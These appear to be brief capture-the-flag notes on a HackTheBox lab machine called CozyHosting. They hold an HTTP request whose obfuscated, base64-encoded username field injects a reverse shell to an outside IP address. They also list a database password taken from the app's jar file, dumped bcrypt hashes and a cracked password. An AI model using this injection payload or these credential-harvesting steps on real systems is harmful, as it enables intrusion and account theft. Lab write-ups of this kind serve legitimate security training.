## Setup
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=1D9B1B3CC09BDD3529D63A7230B4E6CF
Upgrade-Insecure-Requests: 1

host=10.10.14.21&username=%3b%65%63%68%6f%24%7b%49%46%53%25%3f%3f%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%79%4d%53%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%4b%22%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%65%36%34%24%7b%49%46%53%25%3f%3f%7d%2d%64%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%68%3b
```

## Home
```bash
drwxr-x--- 3 josh josh 4096 Aug  8  2023 josh
```
## Cloudhosting.jar
```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting  
spring.datasource.username=postgres  
spring.datasource.password=Vg&nvzAQ7XxR
```

## PSQL
```
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User  
admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi  
n
```

## John
```
manchesterunited
```